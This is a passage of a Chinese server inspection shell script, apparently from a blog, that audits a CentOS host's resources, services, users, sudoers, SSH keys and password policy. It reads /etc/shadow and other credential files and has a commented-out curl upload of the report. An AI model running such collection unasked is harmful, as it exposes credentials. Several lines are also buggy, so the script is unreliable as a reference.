内核：$Kernel\u0026#34; echo \u0026#34; 主机名：$Hostname\u0026#34; echo \u0026#34; SELinux：$SELinux\u0026#34; echo \u0026#34;语言/编码：$default_LANG\u0026#34; echo \u0026#34; 当前时间：$(date +\u0026#39;%F %T\u0026#39;)\u0026#34; echo \u0026#34; 最后启动：$LastReboot\u0026#34; echo \u0026#34; 运行时间：$uptime\u0026#34; export LANG=\u0026#34;$default_LANG\u0026#34; } function getCpuStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m****************************************************CPU检查*****************************************************\\033[0m\u0026#34; Physical_CPUs=$(grep \u0026#34;physical id\u0026#34; /proc/cpuinfo| sort | uniq | wc -l) Virt_CPUs=$(grep \u0026#34;processor\u0026#34; /proc/cpuinfo | wc -l) CPU_Kernels=$(grep \u0026#34;cores\u0026#34; /proc/cpuinfo|uniq| awk -F \u0026#39;: \u0026#39; \u0026#39;{print $2}\u0026#39;) CPU_Type=$(grep \u0026#34;model name\u0026#34; /proc/cpuinfo | awk -F \u0026#39;: \u0026#39; \u0026#39;{print $2}\u0026#39; | sort | uniq) CPU_Arch=$(uname -m) echo \u0026#34;物理CPU个数:$Physical_CPUs\u0026#34; echo \u0026#34;逻辑CPU个数:$Virt_CPUs\u0026#34; echo \u0026#34;每CPU核心数:$CPU_Kernels\u0026#34; echo \u0026#34; CPU型号:$CPU_Type\u0026#34; echo \u0026#34; CPU架构:$CPU_Arch\u0026#34; } function getMemStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m**************************************************内存检查*****************************************************\\033[0m\u0026#34; if [[ $centosVersion \u0026lt; 7 ]];then free -mo else free -h fi #报表信息 MemTotal=$(grep MemTotal /proc/meminfo| awk \u0026#39;{print $2}\u0026#39;) #KB MemFree=$(grep MemFree /proc/meminfo| awk \u0026#39;{print $2}\u0026#39;) #KB let MemUsed=MemTotal-MemFree MemPercent=$(awk \u0026#34;BEGIN {if($MemTotal==0){printf 100}else{printf \\\u0026#34;%.2f\\\u0026#34;,$MemUsed*100/$MemTotal}}\u0026#34;) } function getDiskStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m**************************************************磁盘检查******************************************************\\033[0m\u0026#34; df -hiP | sed \u0026#39;s/Mounted on/Mounted/\u0026#39;\u0026gt; /tmp/inode df -hTP | sed \u0026#39;s/Mounted on/Mounted/\u0026#39;\u0026gt; /tmp/disk join /tmp/disk /tmp/inode | awk \u0026#39;{print $1,$2,\u0026#34;|\u0026#34;,$3,$4,$5,$6,\u0026#34;|\u0026#34;,$8,$9,$10,$11,\u0026#34;|\u0026#34;,$12}\u0026#39;| column -t #报表信息 diskdata=$(df -TP | sed \u0026#39;1d\u0026#39; | awk \u0026#39;$2!=\u0026#34;tmpfs\u0026#34;{print}\u0026#39;) #KB disktotal=$(echo \u0026#34;$diskdata\u0026#34; | awk \u0026#39;{total+=$3}END{print total}\u0026#39;) #KB diskused=$(echo \u0026#34;$diskdata\u0026#34; | awk \u0026#39;{total+=$4}END{print total}\u0026#39;) #KB diskfree=$((disktotal-diskused)) #KB diskusedpercent=$(echo $disktotal $diskused | awk \u0026#39;{if($1==0){printf 100}else{printf \u0026#34;%.2f\u0026#34;,$2*100/$1}}\u0026#39;) inodedata=$(df -iTP | sed \u0026#39;1d\u0026#39; | awk \u0026#39;$2!=\u0026#34;tmpfs\u0026#34;{print}\u0026#39;) inodetotal=$(echo \u0026#34;$inodedata\u0026#34; | awk \u0026#39;{total+=$3}END{print total}\u0026#39;) inodeused=$(echo \u0026#34;$inodedata\u0026#34; | awk \u0026#39;{total+=$4}END{print total}\u0026#39;) inodefree=$((inodetotal-inodeused)) inodeusedpercent=$(echo $inodetotal $inodeused | awk \u0026#39;{if($1==0){printf 100}else{printf \u0026#34;%.2f\u0026#34;,$2*100/$1}}\u0026#39;) } function get_resource(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m**************************************************资源消耗统计**************************************************\\033[0m\u0026#34; echo -e \u0026#34;\\033[36m*************带宽资源消耗统计*************\\033[0m\u0026#34; #用数组存放网卡名 nic=(`ifconfig | grep ^[a-z] | grep -vE \u0026#39;lo|docker0\u0026#39;| awk -F: \u0026#39;{print $1}\u0026#39;`) time=`date \u0026#34;+%Y-%m-%d %k:%M\u0026#34;` num=0 for ((i=0;i\u0026lt;${#nic[@]};i++)) do #循环五次，避免看到的是偶然的数据 while (( $num\u0026lt;5 )) do rx_before=$(cat /proc/net/dev | grep \u0026#39;${nic[$i]}\u0026#39; | tr : \u0026#34; \u0026#34; | awk \u0026#39;{print $2}\u0026#39;) tx_before=$(cat /proc/net/dev | grep \u0026#39;${nic[$i]}\u0026#39; | tr : \u0026#34; \u0026#34; | awk \u0026#39;{print $10}\u0026#39;) sleep 2 #用sed先获取第7列,再用awk获取第2列，再cut切割,从第7个到最后，即只切割网卡流量数字部分 rx_after=$(cat /proc/net/dev | grep \u0026#39;${nic[$i]}\u0026#39; | tr : \u0026#34; \u0026#34; | awk \u0026#39;{print $2}\u0026#39;) tx_after=$(cat /proc/net/dev | grep \u0026#39;${nic[$i]}\u0026#39; | tr : \u0026#34; \u0026#34; | awk \u0026#39;{print $10}\u0026#39;) #注意下面截取的相差2秒的两个时刻的累计和发送的bytes(即累计传送和接收的位) rx_result=$[(rx_after-rx_before)/1024/1024/2*8] tx_result=$[(tx_after-tx_before)/1024/1024/2*8] echo \u0026#34;$time Now_In_Speed: $rx_result Mbps Now_OUt_Speed: $tx_result Mbps\u0026#34; \u0026gt;\u0026gt; /tmp/network.txt let \u0026#34;num++\u0026#34; done #注意下面grep后面的$time变量要用双引号括起来 rx_result=$(cat /tmp/network.txt|grep \u0026#34;$time\u0026#34;|awk \u0026#39;{In+=$4}END{print In}\u0026#39;) tx_result=$(cat /tmp/network.txt|grep \u0026#34;$time\u0026#34;|awk \u0026#39;{Out+=$7}END{print Out}\u0026#39;) In_Speed=$(echo \u0026#34;scale=2;$rx_result/5\u0026#34;|bc) Out_Speed=$(echo \u0026#34;scale=2;$tx_result/5\u0026#34;|bc) echo -e \u0026#34;\\033[32m In_Speed_average: $In_Speed Mbps Out_Speed_average: $Out_Speed Mbps! \\033[0m\u0026#34; done echo -e \u0026#34;\\033[36m*************CPU资源消耗统计*************\\033[0m\u0026#34; #使用vmstat 1 5命令统计5秒内的使用情况，再计算每秒使用情况 total=`vmstat 1 5|awk \u0026#39;{x+=$13;y+=$14}END{print x+y}\u0026#39;` cpu_average=$(echo \u0026#34;scale=2;$total/5\u0026#34;|bc) #判断CPU使用率（浮点数与整数比较） if [ `echo \u0026#34;${cpu_average} \u0026gt; 70\u0026#34; | bc` -eq 1 ];then echo -e \u0026#34;\\033[31m Total CPU is already use: ${cpu_average}%,请及时处理！\\033[0m\u0026#34; else echo -e \u0026#34;\\033[32m Total CPU is already use: ${cpu_average}%! \\033[0m\u0026#34; fi echo -e \u0026#34;\\033[36m*************磁盘资源消耗统计*************\\033[0m\u0026#34; #磁盘使用情况(注意：需要用sed先进行格式化才能进行累加处理) disk_used=$(df -m | sed \u0026#39;1d;/ /!N;s/\\n//;s/ \\+/ /;\u0026#39; | awk \u0026#39;{used+=$3} END{print used}\u0026#39;) disk_totalSpace=$(df -m | sed \u0026#39;1d;/ /!N;s/\\n//;s/ \\+/ /;\u0026#39; | awk \u0026#39;{totalSpace+=$2} END{print totalSpace}\u0026#39;) disk_all=$(echo \u0026#34;scale=4;$disk_used/$disk_totalSpace\u0026#34; | bc) disk_percent1=$(echo $disk_all | cut -c 2-3) disk_percent2=$(echo $disk_all | cut -c 4-5) disk_warning=`df -m | sed \u0026#39;1d;/ /!N;s/\\n//;s/ \\+/ /;\u0026#39; | awk \u0026#39;{if ($5\u0026gt;85) print $6 \u0026#34;目录使用率：\u0026#34; $5;} \u0026#39;` echo -e \u0026#34;\\033[32m Total disk has used: $disk_percent1.$disk_percent2% \\033[0m\u0026#34; #echo -e \u0026#34;\\t\\t..\u0026#34; 表示换行 if [ -n \u0026#34;$disk_warning\u0026#34; ];then echo -e \u0026#34;\\033[31m${disk_warning} \\n [Error]以上目录使用率超过85%，请及时处理！\\033[0m\u0026#34; fi echo -e \u0026#34;\\033[36m*************内存资源消耗统计*************\\033[0m\u0026#34; #获得系统总内存 memery_all=$(free -m | awk \u0026#39;NR==2\u0026#39; | awk \u0026#39;{print $2}\u0026#39;) #获得占用内存（操作系统 角度） system_memery_used=$(free -m | awk \u0026#39;NR==2\u0026#39; | awk \u0026#39;{print $3}\u0026#39;) #获得buffer、cache占用内存，当内存不够时会及时回收，所以这两部分可用于可用内存的计算 buffer_used=$(free -m | awk \u0026#39;NR==2\u0026#39; | awk \u0026#39;{print $6}\u0026#39;) cache_used=$(free -m | awk \u0026#39;NR==2\u0026#39; | awk \u0026#39;{print $7}\u0026#39;) #获得被使用内存，所以这部分可用于可用内存的计算，注意计算方法 actual_used_all=$[memery_all-(free+buffer_used+cache_used)] #获得实际占用的内存 actual_used_all=`expr $memery_all - $free + $buffer_used + $cache_used ` memery_percent=$(echo \u0026#34;scale=4;$system_memery_used / $memery_all\u0026#34; | bc) memery_percent2=$(echo \u0026#34;scale=4; $actual_used_all / $memery_all\u0026#34; | bc) percent_part1=$(echo $memery_percent | cut -c 2-3) percent_part2=$(echo $memery_percent | cut -c 4-5) percent_part11=$(echo $memery_percent2 | cut -c 2-3) percent_part22=$(echo $memery_percent2 | cut -c 4-5) #获得占用内存（操作系统角度） echo -e \u0026#34;\\033[32m system memery is already use: $percent_part1.$percent_part2% \\033[0m\u0026#34; #获得实际内存占用率 echo -e \u0026#34;\\033[32m actual memery is already use: $percent_part11.$percent_part22% \\033[0m\u0026#34; echo -e \u0026#34;\\033[32m buffer is already used : $buffer_used M \\033[0m\u0026#34; echo -e \u0026#34;\\033[32m cache is already used : $cache_used M \\033[0m\u0026#34; } function getServiceStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m*************************************************服务检查*******************************************************\\033[0m\u0026#34; echo \u0026#34;\u0026#34; if [[ $centosVersion \u0026gt; 7 ]];then conf=$(systemctl list-unit-files --type=service --state=enabled --no-pager | grep \u0026#34;enabled\u0026#34;) process=$(systemctl list-units --type=service --state=running --no-pager | grep \u0026#34;.service\u0026#34;) else conf=$(/sbin/chkconfig | grep -E \u0026#34;:on|:启用\u0026#34;) process=$(/sbin/service --status-all 2\u0026gt;/dev/null | grep -E \u0026#34;is running|正在运行\u0026#34;) fi echo -e \u0026#34;\\033[36m******************服务配置******************\\033[0m\u0026#34; echo \u0026#34;$conf\u0026#34; | column -t echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m**************正在运行的服务****************\\033[0m\u0026#34; echo \u0026#34;$process\u0026#34; } function getAutoStartStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m***********************************************自启动检查*******************************************************\\033[0m\u0026#34; echo -e \u0026#34;\\033[36m****************自启动命令*****************\\033[0m\u0026#34; conf=$(grep -v \u0026#34;^#\u0026#34; /etc/rc.d/rc.local| sed \u0026#39;/^$/d\u0026#39;) echo \u0026#34;$conf\u0026#34; } function getLoginStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m************************************************登录检查********************************************************\\033[0m\u0026#34; last | head } function getNetworkStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m************************************************网络检查********************************************************\\033[0m\u0026#34; if [[ $centosVersion \u0026lt; 7 ]];then /sbin/ifconfig -a | grep -v packets | grep -v collisions | grep -v i net6 else #ip a for i in $(ip link | grep BROADCAST | awk -F: \u0026#39;{print $2}\u0026#39;);do ip add show $i | grep -E \u0026#34;BROADCAST|global\u0026#34;| awk \u0026#39;{print $2}\u0026#39; | tr \u0026#39;\\n\u0026#39; \u0026#39; \u0026#39; ;echo \u0026#34;\u0026#34; ;done fi GATEWAY=$(ip route | grep default | awk \u0026#39;{print $3}\u0026#39;) DNS=$(grep nameserver /etc/resolv.conf| grep -v \u0026#34;#\u0026#34; | awk \u0026#39;{print $2}\u0026#39; | tr \u0026#39;\\n\u0026#39; \u0026#39;,\u0026#39; | sed \u0026#39;s/,$//\u0026#39;) echo \u0026#34;\u0026#34; echo \u0026#34;网关：$GATEWAY \u0026#34; echo \u0026#34;DNS：$DNS\u0026#34; #报表信息 IP=$(ip -f inet addr | grep -v 127.0.0.1 | grep inet | awk \u0026#39;{print $NF,$2}\u0026#39; | tr \u0026#39;\\n\u0026#39; \u0026#39;,\u0026#39; | sed \u0026#39;s/,$//\u0026#39;) MAC=$(ip link | grep -v \u0026#34;LOOPBACK\\|loopback\u0026#34; | awk \u0026#39;{print $2}\u0026#39; | sed \u0026#39;N;s/\\n//\u0026#39; | tr \u0026#39;\\n\u0026#39; \u0026#39;,\u0026#39; | sed \u0026#39;s/,$//\u0026#39;) echo \u0026#34;\u0026#34; ping -c 4 www.baidu.com \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 if [ $? -eq 0 ];then echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[32m网络连接：正常！\\033[0m\u0026#34; else echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[31m网络连接：异常！\\033[0m\u0026#34; fi } function getListenStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m***********************************************监听检查********************************************************\\033[0m\u0026#34; TCPListen=$(ss -ntul | column -t) echo \u0026#34;$TCPListen\u0026#34; } function getCronStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m**********************************************计划任务检查******************************************************\\033[0m\u0026#34; Crontab=0 for shell in $(grep -v \u0026#34;/sbin/nologin\u0026#34; /etc/shells);do for user in $(grep \u0026#34;$shell\u0026#34; /etc/passwd| awk -F: \u0026#39;{print $1}\u0026#39;);do crontab -l -u $user \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 status=$? if [ $status -eq 0 ];then echo -e \u0026#34;\\033[36m************$user用户的定时任务**************\\033[0m\u0026#34; crontab -l -u $user let Crontab=Crontab+$(crontab -l -u $user | wc -l) echo \u0026#34;\u0026#34; fi done done #计划任务 #find /etc/cron* -type f | xargs -i ls -l {} | column -t #let Crontab=Crontab+$(find /etc/cron* -type f | wc -l) } function getHowLongAgo(){ # 计算一个时间戳离现在有多久了 datetime=\u0026#34;$*\u0026#34; [ -z \u0026#34;$datetime\u0026#34; ] \u0026amp;\u0026amp; echo `stat /etc/passwd|awk \u0026#34;NR==6\u0026#34;` Timestamp=$(date +%s -d \u0026#34;$datetime\u0026#34;) Now_Timestamp=$(date +%s) Difference_Timestamp=$(($Now_Timestamp-$Timestamp)) days=0;hours=0;minutes=0; sec_in_day=$((60*60*24)); sec_in_hour=$((60*60)); sec_in_minute=60 while (( $(($Difference_Timestamp-$sec_in_day)) \u0026gt; 1 )) do let Difference_Timestamp=Difference_Timestamp-sec_in_day let days++ done while (( $(($Difference_Timestamp-$sec_in_hour)) \u0026gt; 1 )) do let Difference_Timestamp=Difference_Timestamp-sec_in_hour let hours++ done echo \u0026#34;$days 天 $hours 小时前\u0026#34; } function getUserLastLogin(){ # 获取用户最近一次登录的时间，含年份 # 很遗憾last命令不支持显示年份，只有\u0026#34;last -t YYYYMMDDHHMMSS\u0026#34;表示某个时间之间的登录，我 # 们只能用最笨的方法了，对比今天之前和今年元旦之前（或者去年之前和前年之前……）某个用户 # 登录次数，如果登录统计次数有变化，则说明最近一次登录是今年。 username=$1 : ${username:=\u0026#34;`whoami`\u0026#34;} thisYear=$(date +%Y) oldesYear=$(last | tail -n1 | awk \u0026#39;{print $NF}\u0026#39;) while(( $thisYear \u0026gt;= $oldesYear));do loginBeforeToday=$(last $username | grep $username | wc -l) loginBeforeNewYearsDayOfThisYear=$(last $username -t $thisYear\u0026#34;0101000000\u0026#34; | grep $username | wc -l) if [ $loginBeforeToday -eq 0 ];then echo \u0026#34;从未登录过\u0026#34; break elif [ $loginBeforeToday -gt $loginBeforeNewYearsDayOfThisYear ];then lastDateTime=$(last -i $username | head -n1 | awk \u0026#39;{for(i=4;i\u0026lt;(NF-2);i++)printf\u0026#34;%s \u0026#34;,$i}\u0026#39;)\u0026#34; $thisYear\u0026#34; lastDateTime=$(date \u0026#34;+%Y-%m-%d %H:%M:%S\u0026#34; -d \u0026#34;$lastDateTime\u0026#34;) echo \u0026#34;$lastDateTime\u0026#34; break else thisYear=$((thisYear-1)) fi done } function getUserStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m*************************************************用户检查*******************************************************\\033[0m\u0026#34; #/etc/passwd 最后修改时间 pwdfile=\u0026#34;$(cat /etc/passwd)\u0026#34; Modify=$(stat /etc/passwd | grep Modify | tr \u0026#39;.\u0026#39; \u0026#39; \u0026#39; | awk \u0026#39;{print $2,$3}\u0026#39;) echo \u0026#34;/etc/passwd: $Modify ($(getHowLongAgo $Modify))\u0026#34; echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m******************特权用户******************\\033[0m\u0026#34; RootUser=\u0026#34;\u0026#34; for user in $(echo \u0026#34;$pwdfile\u0026#34; | awk -F: \u0026#39;{print $1}\u0026#39;);do if [ $(id -u $user) -eq 0 ];then echo \u0026#34;$user\u0026#34; RootUser=\u0026#34;$RootUser,$user\u0026#34; fi done echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m******************用户列表******************\\033[0m\u0026#34; USERs=0 echo \u0026#34;$( echo \u0026#34;用户名 UID GID HOME SHELL 最后一次登录\u0026#34; for shell in $(grep -v \u0026#34;/sbin/nologin\u0026#34; /etc/shells);do for username in $(grep \u0026#34;$shell\u0026#34; /etc/passwd| awk -F: \u0026#39;{print $1}\u0026#39;);do userLastLogin=\u0026#34;$(getUserLastLogin $username)\u0026#34; echo \u0026#34;$pwdfile\u0026#34; | grep -w \u0026#34;$username\u0026#34; |grep -w \u0026#34;$shell\u0026#34;| awk -F: -v lastlogin=\u0026#34;$(echo \u0026#34;$userLastLogin\u0026#34; | tr \u0026#39; \u0026#39; \u0026#39;_\u0026#39;)\u0026#34; \u0026#39;{print $1,$3,$4,$6,$7,lastlogin}\u0026#39; done let USERs=USERs+$(echo \u0026#34;$pwdfile\u0026#34; | grep \u0026#34;$shell\u0026#34;| wc -l) done )\u0026#34; | column -t echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m******************空密码用户****************\\033[0m\u0026#34; USEREmptyPassword=\u0026#34;\u0026#34; for shell in $(grep -v \u0026#34;/sbin/nologin\u0026#34; /etc/shells);do for user in $(echo \u0026#34;$pwdfile\u0026#34; | grep \u0026#34;$shell\u0026#34; | cut -d: -f1);do r=$(awk -F: \u0026#39;$2==\u0026#34;!!\u0026#34;{print $1}\u0026#39; /etc/shadow | grep -w $user) if [ ! -z $r ];then echo $r USEREmptyPassword=\u0026#34;$USEREmptyPassword,\u0026#34;$r fi done done echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m*****************相同ID用户*****************\\033[0m\u0026#34; USERTheSameUID=\u0026#34;\u0026#34; UIDs=$(cut -d: -f3 /etc/passwd | sort | uniq -c | awk \u0026#39;$1\u0026gt;1{print $2}\u0026#39;) for uid in $UIDs;do echo -n \u0026#34;$uid\u0026#34;; USERTheSameUID=\u0026#34;$uid\u0026#34; r=$(awk -F: \u0026#39;ORS=\u0026#34;\u0026#34;;$3==\u0026#39;\u0026#34;$uid\u0026#34;\u0026#39;{print \u0026#34;:\u0026#34;,$1}\u0026#39; /etc/passwd) echo \u0026#34;$r\u0026#34; echo \u0026#34;\u0026#34; USERTheSameUID=\u0026#34;$USERTheSameUID $r,\u0026#34; done } function getPasswordStatus { echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m*************************************************密码检查*******************************************************\\033[0m\u0026#34; pwdfile=\u0026#34;$(cat /etc/passwd)\u0026#34; echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m****************密码过期检查****************\\033[0m\u0026#34; result=\u0026#34;\u0026#34; for shell in $(grep -v \u0026#34;/sbin/nologin\u0026#34; /etc/shells);do for user in $(echo \u0026#34;$pwdfile\u0026#34; | grep \u0026#34;$shell\u0026#34; | cut -d: -f1);do get_expiry_date=$(/usr/bin/chage -l $user | grep \u0026#39;Password expires\u0026#39; | cut -d: -f2) if [[ $get_expiry_date = \u0026#39; never\u0026#39; || $get_expiry_date = \u0026#39;never\u0026#39; ]];then printf \u0026#34;%-15s 永不过期\\n\u0026#34; $user result=\u0026#34;$result,$user:never\u0026#34; else password_expiry_date=$(date -d \u0026#34;$get_expiry_date\u0026#34; \u0026#34;+%s\u0026#34;) current_date=$(date \u0026#34;+%s\u0026#34;) diff=$(($password_expiry_date-$current_date)) let DAYS=$(($diff/(60*60*24))) printf \u0026#34;%-15s %s天后过期\\n\u0026#34; $user $DAYS result=\u0026#34;$result,$user:$DAYS days\u0026#34; fi done done report_PasswordExpiry=$(echo $result | sed \u0026#39;s/^,//\u0026#39;) echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m****************密码策略检查****************\\033[0m\u0026#34; grep -v \u0026#34;#\u0026#34; /etc/login.defs | grep -E \u0026#34;PASS_MAX_DAYS|PASS_MIN_DAYS|PASS_MIN_LEN|PASS_WARN_AGE\u0026#34; } function getSudoersStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m**********************************************Sudoers检查*******************************************************\\033[0m\u0026#34; conf=$(grep -v \u0026#34;^#\u0026#34; /etc/sudoers| grep -v \u0026#34;^Defaults\u0026#34; | sed \u0026#39;/^$/d\u0026#39;) echo \u0026#34;$conf\u0026#34; echo \u0026#34;\u0026#34; } function getInstalledStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m*************************************************软件检查*******************************************************\\033[0m\u0026#34; rpm -qa --last | head | column -t } function getProcessStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m*************************************************进程检查*******************************************************\\033[0m\u0026#34; if [ $(ps -ef | grep defunct | grep -v grep | wc -l) -ge 1 ];then echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m***************僵尸进程***************\\033[0m\u0026#34; ps -ef | head -n1 ps -ef | grep defunct | grep -v grep fi echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m************CPU占用TOP 10进程*************\\033[0m\u0026#34; echo -e \u0026#34;用户 进程ID %CPU 命令 $(ps aux | awk \u0026#39;{print $1, $2, $3, $11}\u0026#39; | sort -k3rn | head -n 10 )\u0026#34;| column -t echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m************内存占用TOP 10进程*************\\033[0m\u0026#34; echo -e \u0026#34;用户 进程ID %MEM 虚拟内存 常驻内存 命令 $(ps aux | awk \u0026#39;{print $1, $2, $4, $5, $6, $11}\u0026#39; | sort -k3rn | head -n 10 )\u0026#34;| column -t #echo \u0026#34;\u0026#34; #echo -e \u0026#34;\\033[36m************SWAP占用TOP 10进程*************\\033[0m\u0026#34; #awk: fatal: cannot open file `/proc/18713/smaps\u0026#39; for reading (No such file or directory) #for i in `cd /proc;ls |grep \u0026#34;^[0-9]\u0026#34;|awk \u0026#39; $0 \u0026gt;100\u0026#39;`;do awk \u0026#39;{if (-f /proc/$i/smaps) print \u0026#34;$i file is not exist\u0026#34;; else print \u0026#34;$i\u0026#34;}\u0026#39;;done # for i in `cd /proc;ls |grep \u0026#34;^[0-9]\u0026#34;|awk \u0026#39; $0 \u0026gt;100\u0026#39;` ;do awk \u0026#39;/Swap:/{a=a+$2}END{print \u0026#39;\u0026#34;$i\u0026#34;\u0026#39;,a/1024\u0026#34;M\u0026#34;}\u0026#39; /proc/$i/smaps ;done |sort -k2nr \u0026gt; /tmp/swap.txt #echo -e \u0026#34;进程ID SWAP使用 $(cat /tmp/swap.txt|grep -v awk | head -n 10)\u0026#34;| column -t } function getSyslogStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m***********************************************syslog检查*******************************************************\\033[0m\u0026#34; echo \u0026#34;SYSLOG服务状态：$(getState rsyslog)\u0026#34; echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m***************rsyslog配置******************\\033[0m\u0026#34; cat /etc/rsyslog.conf 2\u0026gt;/dev/null | grep -v \u0026#34;^#\u0026#34; | grep -v \u0026#34;^\\\\$\u0026#34; | sed \u0026#39;/^$/d\u0026#39; | column -t } function getFirewallStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m***********************************************防火墙检查*******************************************************\\033[0m\u0026#34; echo -e \u0026#34;\\033[36m****************防火墙状态******************\\033[0m\u0026#34; if [[ $centosVersion = 7 ]];then systemctl status firewalld \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 status=$? if [ $status -eq 0 ];then s=\u0026#34;active\u0026#34; elif [ $status -eq 3 ];then s=\u0026#34;inactive\u0026#34; elif [ $status -eq 4 ];then s=\u0026#34;permission denied\u0026#34; else s=\u0026#34;unknown\u0026#34; fi else s=\u0026#34;$(getState iptables)\u0026#34; fi echo \u0026#34;firewalld: $s\u0026#34; echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m****************防火墙配置******************\\033[0m\u0026#34; cat /etc/sysconfig/firewalld 2\u0026gt;/dev/null } function getSNMPStatus(){ #SNMP服务状态，配置等 echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m***********************************************SNMP检查*********************************************************\\033[0m\u0026#34; status=\u0026#34;$(getState snmpd)\u0026#34; echo \u0026#34;SNMP服务状态：$status\u0026#34; echo \u0026#34;\u0026#34; if [ -e /etc/snmp/snmpd.conf ];then echo \u0026#34;/etc/snmp/snmpd.conf\u0026#34; echo \u0026#34;--------------------\u0026#34; cat /etc/snmp/snmpd.conf 2\u0026gt;/dev/null | grep -v \u0026#34;^#\u0026#34; | sed \u0026#39;/^$/d\u0026#39; fi } function getState(){ if [[ $centosVersion \u0026lt; 7 ]];then if [ -e \u0026#34;/etc/init.d/$1\u0026#34; ];then if [ `/etc/init.d/$1 status 2\u0026gt;/dev/null | grep -E \u0026#34;is running|正在运行\u0026#34; | wc -l` -ge 1 ];then r=\u0026#34;active\u0026#34; else r=\u0026#34;inactive\u0026#34; fi else r=\u0026#34;unknown\u0026#34; fi else #CentOS 7+ r=\u0026#34;$(systemctl is-active $1 2\u0026gt;\u0026amp;1)\u0026#34; fi echo \u0026#34;$r\u0026#34; } function getSSHStatus(){ #SSHD服务状态，配置,受信任主机等 echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m************************************************SSH检查*********************************************************\\033[0m\u0026#34; #检查受信任主机 pwdfile=\u0026#34;$(cat /etc/passwd)\u0026#34; echo \u0026#34;SSH服务状态：$(getState sshd)\u0026#34; Protocol_Version=$(cat /etc/ssh/sshd_config | grep Protocol | awk \u0026#39;{print $2}\u0026#39;) echo \u0026#34;SSH协议版本：$Protocol_Version\u0026#34; echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m****************信任主机******************\\033[0m\u0026#34; authorized=0 for user in $(echo \u0026#34;$pwdfile\u0026#34; | grep /bin/bash | awk -F: \u0026#39;{print $1}\u0026#39;);do authorize_file=$(echo \u0026#34;$pwdfile\u0026#34; | grep -w $user | awk -F: \u0026#39;{printf $6\u0026#34;/.ssh/authorized_keys\u0026#34;}\u0026#39;) authorized_host=$(cat $authorize_file 2\u0026gt;/dev/null | awk \u0026#39;{print $3}\u0026#39; | tr \u0026#39;\\n\u0026#39; \u0026#39;,\u0026#39; | sed \u0026#39;s/,$//\u0026#39;) if [ ! -z $authorized_host ];then echo \u0026#34;$user 授权 \\\u0026#34;$authorized_host\\\u0026#34; 无密码访问\u0026#34; fi let authorized=authorized+$(cat $authorize_file 2\u0026gt;/dev/null | awk \u0026#39;{print $3}\u0026#39;|wc -l) done echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m*******是否允许ROOT远程登录***************\\033[0m\u0026#34; config=$(cat /etc/ssh/sshd_config | grep PermitRootLogin) firstChar=${config:0:1} if [ $firstChar == \u0026#34;#\u0026#34; ];then PermitRootLogin=\u0026#34;yes\u0026#34; else PermitRootLogin=$(echo $config | awk \u0026#39;{print $2}\u0026#39;) fi echo \u0026#34;PermitRootLogin $PermitRootLogin\u0026#34; echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m*************ssh服务配置******************\\033[0m\u0026#34; cat /etc/ssh/sshd_config | grep -v \u0026#34;^#\u0026#34; | sed \u0026#39;/^$/d\u0026#39; } function getNTPStatus(){ #NTP服务状态，当前时间，配置等 echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m***********************************************NTP检查**********************************************************\\033[0m\u0026#34; if [ -e /etc/ntp.conf ];then echo \u0026#34;NTP服务状态：$(getState ntpd)\u0026#34; echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m*************NTP服务配置******************\\033[0m\u0026#34; cat /etc/ntp.conf 2\u0026gt;/dev/null | grep -v \u0026#34;^#\u0026#34; | sed \u0026#39;/^$/d\u0026#39; fi } function check(){ version getSystemStatus get_resource getCpuStatus getMemStatus getDiskStatus getNetworkStatus getListenStatus getProcessStatus getServiceStatus getAutoStartStatus getLoginStatus getCronStatus getUserStatus getPasswordStatus getSudoersStatus getFirewallStatus getSSHStatus getSyslogStatus getSNMPStatus getNTPStatus getInstalledStatus } #执行检查并保存检查结果 check \u0026gt; $RESULTFILE echo -e \u0026#34;\\033[44;37m 主机巡检结果存放在：$RESULTFILE \\033[0m\u0026#34; #上传检查结果的文件 #curl -F \u0026#34;filename=@$RESULTFILE\u0026#34; \u0026#34;$uploadHostDailyCheckApi\u0026#34; 2\u0026gt;/dev/null cat $RESULTFILE ","permalink":"https://lvbibir.github.io/posts/tech/shell_server_inspection/","summary":"#!/bin/bash #参数定义 date=`date 